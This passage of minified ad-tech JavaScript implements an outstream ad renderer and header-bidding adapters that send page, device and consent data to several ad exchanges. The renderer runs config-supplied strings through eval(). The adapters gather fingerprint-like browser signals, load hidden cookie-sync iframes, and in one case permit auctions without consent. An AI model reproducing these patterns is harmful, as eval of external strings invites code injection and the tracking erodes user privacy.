    getKeywords: function (t, e) {
      if (null == this.keywords || void 0 === this.keywords) {
        var i = this.extractKeywords();
        this.keywords = i;
      }
      e(this.mergeKeywords(t, this.keywords));
    },
    extractKeywords: function () {
      var t = {},
        e = navigator.userAgent;
      if (e && -1 !== e && void 0 !== AdTrack.UAParser) {
        var i = new AdTrack.UAParser();
        i.setUA(e);
        var r = i.getDevice();
        r.vendor && (t[r.vendor] = "ua_device_vendor"), r.model && (t[r.model] = "ua_device_model");
      }
      return t;
    },
    mergeKeywords: function (t, e) {
      var i = {};
      for (var r in t) t.hasOwnProperty(r) && (i[r] = t[r]);
      for (var r in e) e.hasOwnProperty(r) && (i[r] = e[r]);
      return i;
    }
  };
}, function (module, exports) {
  AdTrack.OutstreamRenderer = function (t, e, i, r, n, s) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.transforms = i, this.events = r, this.errorReporting = n, this.metrics = s, this.container = null, this.element = null, this.expanded = !1, this.collapsing = !1, this.height = 0, this.expandTime = 350, this.fps = 60, this.definition.options && (this.maxWidth = this.definition.options.width, this.maxHeight = this.definition.options.height), this.isLoaded = !1, this.impressListener = null;
  }, AdTrack.OutstreamRenderer.prototype = {
    isReadyToShow: function (t) {
      var e = function () {
        var e = t.getBoundingClientRect().top,
          i = AdTrack.Utils.getViewportRealHeight(this.window);
        return e > 0 && e <= i / 2;
      }.bind(this);
      return this.impressListener = function () {
        e() && (this.events.trigger("ready"), AdTrack.Utils.removeEvent(this.window, "resize", this.impressListener), AdTrack.Utils.removeEvent(this.window, "scroll", this.impressListener), AdTrack.Utils.removeEvent(this.window, "build", this.impressListener), this.impressListener = null);
      }.bind(this), AdTrack.Utils.addEvent(this.window, "resize", this.impressListener), AdTrack.Utils.addEvent(this.window, "scroll", this.impressListener), AdTrack.Utils.addEvent(this.window, "build", this.impressListener), e();
    },
    getContainer: function () {
      return this.container;
    },
    createContainer: function (t) {
      return this.container || (this.mainWrap = t, this.container = this.window.document.createElement("div"), this.container.setAttribute("style", "display: block; width: 100%; height: 0 !important; overflow: hidden !important;"), this.mainWrap.appendChild(this.container)), this.container;
    },
    expand: function () {
      var t = this.element;
      if (this.expanded = !0, this.expandHeight) {
        t.style.height = 0, t.style.display = "block", this.height = 0, this.container.setAttribute("style", "display: block; width: auto; height: auto; overflow: hidden;");
        var e = this._getSettings(this.expandHeight),
          i = function () {
            this.definitionObj.getOption("noExpand") && (this.height = this.expandHeight, t.style.height = this.height + "px"), this.height >= this.expandHeight ? this.events.trigger("expand") : (t.style.height = (this.height += e.step) + "px", this.collapsing || setTimeout(i.bind(this), e.interval));
          }.bind(this);
        i();
      } else this.container.setAttribute("style", "display: block; width: auto; height: auto; overflow: hidden;"), this.height = Math.floor(t.clientHeight), this.expandHeight = this.height, this.events.trigger("expand");
    },
    collapse: function () {
      var t = this.element;
      if (this.height > 0 && this.expanded) {
        this.collapsing = !0;
        var e = this._getSettings(this.expandHeight),
          i = function () {
            if (this.height <= 0) return t.style.height = "0px", t.style.display = "none", void this.events.trigger("collapse");
            t.style.height = (this.height -= e.step) + "px", setTimeout(i.bind(this), e.interval);
          }.bind(this);
        i();
      } else this.errorReporting.doError("Unable to collapse, expanded: " + this.expanded + ", height: " + this.height);
    },
    _getSettings: function (t) {
      var e = 1e3 / this.fps,
        i = t / (this.expandTime / e);
      return {
        interval: Math.floor(e),
        step: Math.floor(i)
      };
    },
    loaded: function (format) {
      this.isLoaded = !0, "function" == typeof format.getElement && (this.element = format.getElement() || this.container), this.maxWidth && (this.mainWrap.style.maxWidth = this.maxWidth + "px");
      var rect = this.container.getBoundingClientRect(),
        w = rect.right - rect.left;
      this.expandHeight = w / (16 / 9), this.element.clientHeight > 40 && (this.expandHeight = this.element.clientHeight), this.element === this.container && (this.expandHeight = 0), this.maxHeight > 0 && this.maxHeight < this.expandHeight && (this.expandHeight = this.maxHeight), format.on("end", function () {
        this.hide();
      }.bind(this)), this.show(), this.events.addCallback("collapse", function () {
        var collapse = this.definition.options.outstreamCollapse;
        collapse && (collapse = AdTrack.Utils.replaceMacros(collapse, this.definition.macros), eval(collapse)), this.destroy();
      }.bind(this)), this.events.addCallback("expand", function () {
        var expand = this.definition.options.outstreamExpand;
        expand && (expand = AdTrack.Utils.replaceMacros(expand, this.definition.macros), eval(expand));
      }.bind(this)), this.events.trigger("show");
    },
    measureImpress: function () {
      return AdTrack.Viewability.getVisiblePercentage(this.container);
    },
    destroy: function () {
      this.impressListener && (AdTrack.Utils.removeEvent(this.window, "resize", this.impressListener), AdTrack.Utils.removeEvent(this.window, "scroll", this.impressListener), AdTrack.Utils.removeEvent(this.window, "build", this.impressListener), this.impressListener = null), this.events.trigger("destroy");
    },
    show: function () {
      this.expand();
    },
    hide: function () {
      this.collapse();
    },
    open: function () {
      this.expand();
    },
    close: function () {
      this.collapse();
    }
  };
}, function (t, e) {
  AdTrack.AdagioHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("adagio"), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
    var r = this.track.window;
    r.ADAGIO = r.ADAGIO || {}, r.ADAGIO.pageviewId = r.ADAGIO.pageviewId || AdTrack.Utils.uuid();
  }, AdTrack.AdagioHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.track.window,
        r = e.split(":");
      2 !== r.length && this.track.doError("Wrong format for key, should be: [site]:[placement]");
      for (var n = [[this.chd.width, this.chd.height]], s = this.chd.sizes ? this.chd.sizes : [], a = 0; a < s.length; a++) 2 === s[a].length && n.push(s[a]);
      var o,
        d,
        c = function () {
          try {
            var t = this.track.definition.options.dom,
              e = t.selector || t.container,
              i = this.track.document.querySelector(e);
            if (i) return i;
          } catch (t) {}
        }.bind(this),
        h = function () {
          try {
            var t = c();
            if (!AdTrack.Utils.isSafeFrameWindow(this.track.window) && !AdTrack.Utils.windowTopAccess()) return "";
            var e = {
              x: 0,
              y: 0
            };
            if (AdTrack.Utils.isSafeFrameWindow(this.track.window)) {
              var i = this.track.window;
              if ("function" != typeof i.$sf.ext.geom) return "";
              var r = i.$sf.ext.geom();
              return r && r.self ? (e.x = Math.round(r.t), e.y = Math.round(r.l), e.x + "x" + e.y) : "";
            }
            if (AdTrack.Utils.windowTopAccess() && t) {
              var n = AdTrack.Utils.windowTopAccess() || this.track.window,
                s = this.track.window.document,
                a = t.getBoundingClientRect(),
                o = s.documentElement,
                d = s.body,
                h = s.clientTop || d.clientTop || 0,
                l = s.clientLeft || d.clientLeft || 0,
                u = n.pageYOffset || o.scrollTop || d.scrollTop,
                p = n.pageXOffset || o.scrollLeft || d.scrollLeft;
              return e.x = Math.round(a.left + p - l), e.y = Math.round(a.top + u - h), e.x + "x" + e.y;
            }
          } catch (t) {}
          return "";
        }.bind(this),
        l = function () {
          var t = i.navigator.userAgent;
          return /(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(t) ? 5 : /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile|Kindle|NetFront|Silk-Accelerated|(hpw|web)OS|Fennec|Minimo|Opera M(obi|ini)|Blazer|Dolfin|Dolphin|Skyfire|Zune/.test(t) ? 4 : 2;
        },
        u = {
          id: "" + AdTrack.Utils.uuid(),
          organizationId: "" + this.accountId,
          secure: AdTrack.Utils.isSecure(AdTrack.url) ? 1 : 0,
          device: {
            userAgent: navigator.userAgent,
            language: navigator.language || navigator.userLanguage,
            deviceType: l(),
            dnt: AdTrack.Utils.getDNT(),
            geo: {},
            js: 1
          },
          site: {
            domain: "" + i.location.hostname,
            page: "" + i.location.href,
            referrer: i.document.referrer || ""
          },
          pageviewId: i.ADAGIO.pageviewId || AdTrack.Utils.uuid(),
          adUnits: [],
          regs: {
            gdpr: {
              apiVersion: 2,
              consentString: "",
              consentRequired: 1,
              allowAuctionWithoutConsent: 1
            },
            coppa: {},
            ccpa: {}
          },
          schain: {},
          prebidVersion: "4.11.0",
          adapterVersion: "2.4.0",
          featuresVersion: "1"
        };
      u.adUnits.push({
        bidder: "adagio",
        params: {
          organizationId: "" + this.accountId,
          site: r[0],
          adUnitElementId: "r2b2",
          placement: r[1],
          environment: AdTrack.Utils.isMobile() ? "mobile" : "desktop",
          postBid: "1"
        },
        mediaTypes: {
          banner: {
            sizes: n
          }
        },
        adUnitCode: "r2b2",
        transactionId: AdTrack.Utils.uuid(),
        sizes: n,
        bidId: AdTrack.Utils.uuid(),
        bidderRequestId: AdTrack.Utils.uuid(),
        auctionId: AdTrack.Utils.uuid(),
        src: "client",
        bidRequestsCount: 1,
        bidderRequestsCount: 1,
        bidderWinsCount: 0,
        features: {
          print_number: "1",
          page_dimensions: function () {
            var t = AdTrack.Utils.windowTopAccess();
            if (!t) return "";
            var e = t.document.querySelector("body");
            if (!e) return "";
            var i = t.document.documentElement;
            return Math.max(e.scrollWidth, e.offsetWidth, i.clientWidth, i.scrollWidth, i.offsetWidth) + "x" + Math.max(e.scrollHeight, e.offsetHeight, i.clientHeight, i.scrollHeight, i.offsetHeight);
          }(),
          viewport_dimensions: AdTrack.Utils.getViewportRealWidth(i) + "x" + AdTrack.Utils.getViewportRealHeight(i),
          adunit_position: h(),
          dom_loading: "" + (50 + Math.round(100 * Math.random())),
          user_timestamp: "" + (Math.floor(new Date().getTime() / 1e3) - 60 * new Date().getTimezoneOffset()),
          device: "" + l(),
          url: AdTrack.url,
          browser: (o = i.navigator.userAgent, d = o.toLowerCase(), /Edge\/\d./i.test(o) ? "edge" : d.indexOf("chrome") > 0 ? "chrome" : d.indexOf("firefox") > 0 ? "firefox" : d.indexOf("safari") > 0 ? "safari" : d.indexOf("opera") > 0 ? "opera" : d.indexOf("msie") > 0 || i.MSStream ? "ie" : "unknow"),
          os: function () {
            var t = i.navigator.userAgent.toLowerCase();
            return t.indexOf("linux") > 0 ? "linux" : t.indexOf("mac") > 0 ? "mac" : t.indexOf("win") > 0 ? "windows" : "";
          }()
        }
      });
      var p = this.track.getSupplyChain();
      p && (u.schain = p);
      var f = !1,
        g = !1;
      if (AdTrack.CMP) {
        var m = AdTrack.CMP.getConsentData();
        m && m.consentString && (f = !0, u.regs.gdpr = {
          apiVersion: m.version ? m.version : null,
          consentString: m.consentString ? m.consentString : "",
          consentRequired: m.gdprApplies ? 1 : 0,
          allowAuctionWithoutConsent: 1
        });
      }
      if (AdTrack.USP) {
        var k = AdTrack.USP.getConsentData();
        k && k.consentString && (g = !0, u.regs.ccpa = {
          uspConsent: k.consentString
        });
      }
      (f || g) && this.track.evBidConsent(this.definition, this.chd, f, g);
      var b = function (e) {
          if (this.response = e, AdTrack.UserSync.addUserSync("adagio", 617, function () {
            "function" == typeof AdTrack.AdagioCSync && AdTrack.AdagioCSync(e);
          }, this.track.settings), e.bids && e.bids.length > 0) {
            if (e.bids[0]) {
              var i = e.bids[0],
                r = AdTrack.Utils.isBlackListedAds(i.ad),
                n = AdTrack.Utils.testAd(i.ad, this.definition.options.contentBlackList || []);
              !1 === r && !1 === n ? i.cpm ? i.currency === this.chd.currency ? (this.price = AdTrack.Price.create(i.cpm, this.chd.currency), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.creativeId), i.width && i.height && (this.bidResponse.setWidth(i.width), this.bidResponse.setHeight(i.height)), t && t(this.price, this.response)) : (this.track.doError("Channel " + this.chd.tag + " responded with unsupported currency (" + i.currency + ")."), t && t(null, null)) : (this.track.doError("Channel " + this.chd.tag + " responded with empty currency."), t && t(null, null)) : (r && this.track.doError("Blocked Adagio creative (" + i.creativeId + ") from " + r, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, i.creativeId || "", "", i.cpm, i.ad), t && t(null, null));
            } else this.track.doError("Channel " + this.chd.tag + " responded with unknown response."), t && t(null, null);
          } else t && t(null, null);
        }.bind(this),
        v = function (e, i) {
          i ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, t && t(null, null);
        }.bind(this);
      AdTrack.Ajax.request({
        label: "Adagio bid",
        url: "https://mp.4dex.io/prebid",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(u),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        b(t);
      }).fail(function (t, e) {
        v(t, e);
      }).send();
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.bids && t.bids[0]) {
            var e = t.bids[0];
            this.adData = e.ad, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.ad,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  var i;
  AdTrack.BetweenHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], this.track.shouldCsync("between") && AdTrack.UserSync.addUserSync("between", 724, function () {
      AdTrack.BetweenCSync();
    }.bind(this), this.track.settings);
  }, AdTrack.BetweenHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.createData(e),
        r = this;
      AdTrack.Ajax.request({
        label: "Between bid",
        url: "https://ads.betweendigital.com/adjson?" + i,
        method: "GET",
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this),
        withCredentials: !0
      }, this.track.errorReporting).done(function (e) {
        if (e && e[0] && e[0].cpm && e[0].ad) {
          var i = e[0];
          i.currency && i.currency === AdTrack.Price.USD ? (r.price = AdTrack.Price.create(i.cpm, AdTrack.Price.USD, null), r.bidResponse.setPrice(r.price), r.bidResponse.setCreativeId(i.creativeid), r.bidResponse.setWidth(i.w ? i.w : r.chd.width), r.bidResponse.setHeight(i.h ? i.h : r.chd.height)) : r.track.doError("Channel " + r.chd.tag + " responsed with wrong currency: " + i.currency);
        } else r.price = null;
        r.response = e, t && t(r.price, e);
      }).fail(function (e, i) {
        i ? r.track.evBidTimeout(r.definition, r.chd) : r.track.evBidError(r.definition, r.chd), r.price = null, t && t(null, null);
      }).send();
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t[0] && t[0].cpm && t[0].ad) {
            var e = t[0];
            this.adData = e.ad, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.ad,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      var e = AdTrack.Utils.simpleStringGenerator(14),
        i = AdTrack.Utils.simpleStringGenerator(14),
        r = AdTrack.Utils.simpleStringGenerator(14),
        n = new Date(),
        s = [];
      for (let t = 0; t < this.sizes.length; t++) {
        const e = this.sizes[t];
        s.push(e[0] + "x" + e[1]);
      }
      var a,
        o = ["sizes=" + s.join("%2C"), "jst=hb", "s=" + encodeURIComponent(t), "cur=USD", "ord=" + 1e16 * Math.random(), "tz=" + encodeURIComponent(n.getTimezoneOffset()), "fl=0", "rr=" + encodeURIComponent(this.getRr()), "bidid=" + encodeURIComponent(e), "transactionid=" + encodeURIComponent(r), "auctionid=" + encodeURIComponent(i)],
        d = this.track.getSupplyChain();
      if (d) {
        o.push("schain=" + (a = JSON.stringify(d), btoa(a).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "")));
      }
      if (AdTrack.CMP) var c = AdTrack.CMP.getConsentData();
      return c && (this.track.evBidConsent(this.definition, this.chd, !0), void 0 !== c.gdprApplies && o.push("gdprApplies=" + encodeURIComponent(!!c.gdprApplies)), void 0 !== c.consentString && o.push("consentString=" + encodeURIComponent(c.consentString))), o.join("&");
    },
    getRr: function () {
      try {
        var t = top.document.referrer;
      } catch (t) {
        return !1;
      }
      return void 0 !== t && t.length > 0 ? encodeURIComponent(t) : void 0 !== t && "" == t ? "direct" : void 0;
    }
  }, AdTrack.BetweenCSync = AdTrack.BetweenCSync || (i = !1, function () {
    i || (AdTrack.Utils.csyncFrame("https://ads.betweendigital.com/sspmatch-iframe"), i = !0);
  });
}, function (t, e) {
  AdTrack.CriteoHBXHRVideoChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.CriteoHBXHRVideoChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    profiling: function (t) {
      this.track.metrics.evProfiling("Criteo-HB-XHR " + t);
    },
    bid: function (t, e) {
      AdTrack.Criteo.bid(this.track, this.chd, this.bidResponse, e, AdTrack.Criteo.VIDEO, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      this.container = t, e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.slots && t.slots[0]) {
            var e = t.slots[0];
            if (e.displayurl) {
              var r = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, e.displayurl, "vast_url"),
                n = new AdTrack.MediaTypes.Video(r, this.track.errorReporting);
              i(n);
            } else this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  var i;
  AdTrack.OneTagChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], AdTrack.CMP && (this.consent = AdTrack.CMP.getConsentData()), AdTrack.USP && (this.uspConsent = AdTrack.USP.getConsentData()), this.track.shouldCsync("onetag") && AdTrack.UserSync.addUserSync("onetag", 241, function () {
      AdTrack.OneTagCSync(this.consent, this.uspConsent);
    }.bind(this), this.track.settings);
  }, AdTrack.OneTagChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = AdTrack.Config.getAccountId("onetag");
      if (i) {
        var r = this.createData(e, i),
          n = this;
        AdTrack.Ajax.request({
          label: "Onetag bid",
          url: "https://onetag-sys.com/prebid-request",
          method: "POST",
          data: JSON.stringify(r),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this),
          withCredentials: !0
        }, this.track.errorReporting).done(function (e) {
          if (e && e.bids && e.bids[0] && e.bids[0].cpm && e.bids[0].ad) {
            var i = e.bids[0];
            e.currency && e.currency !== AdTrack.Price.EUR ? n.track.doError("Channel " + n.chd.tag + " responsed with wrong currency: " + e.currency) : (n.price = AdTrack.Price.create(i.cpm, AdTrack.Price.EUR, null), n.bidResponse.setPrice(n.price), n.bidResponse.setCreativeId(i.creativeId), n.bidResponse.setWidth(i.width ? i.width : n.chd.width), n.bidResponse.setHeight(i.height ? i.height : n.chd.height));
          } else n.price = null;
          n.response = e, t && t(n.price, e);
        }).fail(function (e, i) {
          i ? n.track.evBidTimeout(n.definition, n.chd) : n.track.evBidError(n.definition, n.chd), n.price = null, t && t(null, null);
        }).send();
      } else this.track.doError("OneTag accountId not defined. " + this.chd.tag);
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.bids && t.bids[0] && t.bids[0].cpm && t.bids[0].ad) {
            var e = t.bids[0];
            this.adData = e.ad, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.ad,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t, e) {
      var i = AdTrack.Utils.simpleStringGenerator(14),
        r = AdTrack.Utils.simpleStringGenerator(14),
        n = AdTrack.Utils.simpleStringGenerator(14),
        s = AdTrack.Utils.simpleStringGenerator(14),
        a = new Date(),
        o = [];
      for (let t = 0; t < this.sizes.length; t++) {
        const e = this.sizes[t];
        o.push({
          width: e[0],
          height: e[1]
        });
      }
      var d = {
          bids: [{
            adUnitCode: t,
            type: "banner",
            bidId: i,
            bidderRequestId: r,
            auctionId: n,
            transactionId: s,
            sizes: o,
            pubId: e
          }],
          location: encodeURIComponent(AdTrack.url),
          referrer: encodeURIComponent(window.document.referrer),
          masked: 0,
          wWidth: window.innerWidth,
          wHeight: window.innerHeight,
          oWidth: window.outerWidth,
          oHeight: window.outerHeight,
          sWidth: screen.width,
          sHeight: screen.height,
          aWidth: screen.availWidth,
          aHeight: screen.availHeight,
          sLeft: "screenLeft" in window ? window.screenLeft : window.screenX,
          sTop: "screenTop" in window ? window.screenTop : window.screenY,
          hLength: history.length,
          date: a.toUTCString(),
          timeOffset: a.getTimezoneOffset()
        },
        c = !1,
        h = !1;
      if (this.consent && (c = !0, d.gdprConsent = {
        consentString: this.consent.consentString,
        consentRequired: this.consent.gdprApplies
      }), this.uspConsent && this.uspConsent.consentString && (h = !0, d.usPrivacy = this.uspConsent.consentString), (c || h) && this.track.evBidConsent(this.definition, this.chd, c, h), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var l = AdTrack.UserID.getAllUserIdsAsEids();
        l.length > 0 && (d.userId = l);
      }
      var u = this.track.getSupplyChain();
      u && (d.schain = u);
      var p = AdTrack.Utils.getLocalStorageItem("onetag_sid");
      return p && (d.onetagSid = p), d;
    }
  }, AdTrack.OneTagCSync = AdTrack.OneTagCSync || (i = !1, function (t, e) {
    if (!i) {
      var r = "https://onetag-sys.com/usync/?cb=" + new Date().getTime();
      t && (r += "&gdpr_consent=" + (t.consentString ? t.consentString : ""), r += "&gdpr=" + (t.gdprApplies ? 1 : 0)), e && e.consentString && (r += "&us_privacy=" + e.consentString);
      var n = document.createElement("iframe");
      n.src = r, n.style.display = "none", window.document.body.appendChild(n), i = !0;
    }
  });
}, function (t, e) {
  AdTrack.R2B2Channel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.delayTime = 1e3;
    var r = this.chd.keys[1];
    r.t && delete r.t, this.cookieSync(), this.MTsupport = !0;
  }, AdTrack.R2B2Channel.prototype = {
    bid: function (t, e) {
      var i = this,
        r = this.createData(e);
      r ? AdTrack.Ajax.request({
        label: "R2B2 bid",
        url: "https://hb.trackad.cz/openrtb2/bid",
        method: "POST",
        data: JSON.stringify(r),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        if (e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
          var r = e.seatbid[0].bid[0],
            n = e.seatbid[0].seat;
          i.chd.flag = "-" + n, i.price = AdTrack.Price.create(r.price, AdTrack.Price.USD, r.dealid), "DID-811-92131" == r.dealid && i.track.doError("Deal ID (DID-811-92131) received directly from R2B2 channel with price " + r.price + " USD", "debug");
        } else i.price = null;
        if (e.ext && e.ext.errors) {
          var s = e.ext.errors;
          for (var a in s) if (s.hasOwnProperty(a)) {
            var o = s[a];
            i.track.doError("[s2s] Response from " + a + " has errors: " + JSON.stringify(o));
          }
        }
        i.response = e, t && t(i.price, e);
      }).fail(function (e, r) {
        r ? i.track.evBidTimeout(i.definition, i.chd) : i.track.evBidError(i.definition, i.chd), i.price = null, t && t(null, null);
      }).send() : t(null, null);
    },
    render: function (t, e, i) {
      e = e && e.normal ? e.normal : null;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0],
              r = e.adm,
              n = e.w,
              s = e.h;
            e.ext.prebid.type;
            this.chd.width = n, this.chd.height = s;
            var a = {
              chd: this.chd,
              width: this.chd.width,
              height: this.chd.height,
              ad: {}
            };
            a.ad.data = "<html><head><script>window.inDapIF=true;<\/script></head><body>" + r + "</body></html>", a.ad.type = "content";
            var o = [];
            e.iurl && o.push(e.iurl);
            var d = AdTrack.Utils.deepAccess(e, "ext.r2b2.iurl");
            "string" == typeof d && o.push(d), a.impTrackers = o;
            var c = new AdTrack.MediaTypes.Banner(a, this.track.errorReporting);
            i(c);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      var e = AdTrack.Utils.uuid(),
        i = "AdTrack" + Math.round(1e9 * Math.random()),
        r = {
          ext: {}
        },
        n = {},
        s = null;
      if (AdTrack.CMP && (s = AdTrack.CMP.getConsentData()), s && (this.track.evBidConsent(this.definition, this.chd, !0), r.ext.consent = s.consentString ? s.consentString : "", n.gdpr = s.gdprApplies ? 1 : 0), AdTrack.UserID) {
        var a = AdTrack.UserID.getAllUserIdsAsEids();
        a && a.length > 0 && (r.ext.eids = a);
      }
      if ("object" == typeof t && t.d && t.g && t.p) {
        t.m = t.m || 0;
        var o = {
          id: e,
          user: r,
          regs: n,
          site: {
            page: AdTrack.url
          },
          imp: [{
            id: i,
            ext: {
              r2b2: t
            },
            banner: {
              format: [{
                h: this.chd.height,
                w: this.chd.width
              }]
            }
          }],
          source: {
            tid: e
          },
          tmax: this.delayTime
        };
        return "true" === AdTrack.Utils.getParameterByName("adtrack-debug") && (o.test = 1), o;
      }
      this.track.doError("Wrong format for R2B2 key");
    },
    cookieSync: function () {
      var t = this.chd.keys[1];
      if (t.d && t.g && t.p) {
        t.m = t.m || 0;
        var e = [{
            d: t.d,
            g: t.g,
            p: t.p,
            m: t.m
          }],
          i = "//hb.trackad.cz/cookieSync?p=" + btoa(JSON.stringify(e)),
          r = null;
        AdTrack.CMP && (r = AdTrack.CMP.getConsentData()), r && (i += "&gdpr=" + (r.gdprApplies ? 1 : 0), i += "&gdpr_consent=" + (r.consentString ? r.consentString : "")), AdTrack.Utils.csyncFrame(i);
      }
    }
  };
}, function (t, e) {
  var i;
  AdTrack.SeedtagHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]];
  }, AdTrack.SeedtagHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.chd.accountId ? this.chd.accountId : AdTrack.Config.getAccountId("seedtag");
      if (i) {
        var r = this.createData(e, i),
          n = this;
        AdTrack.Ajax.request({
          label: "Seedtag bid",
          url: "https://s.seedtag.com/c/hb/bid",
          method: "POST",
          data: JSON.stringify(r),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          withCredentials: !0,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (e) {
          if (e && e.bids && e.bids[0] && e.bids[0].price && e.bids[0].content) {
            var i = e.bids[0];
            e.currency && e.currency !== AdTrack.Price.USD ? n.track.doError("Channel " + n.chd.tag + " responsed with wrong currency: " + e.currency) : (n.price = AdTrack.Price.create(i.price, AdTrack.Price.USD, null), n.bidResponse.setPrice(n.price), n.bidResponse.setCreativeId(i.creativeId), n.bidResponse.setWidth(i.width ? i.width : n.chd.width), n.bidResponse.setHeight(i.height ? i.height : n.chd.height));
          } else n.price = null;
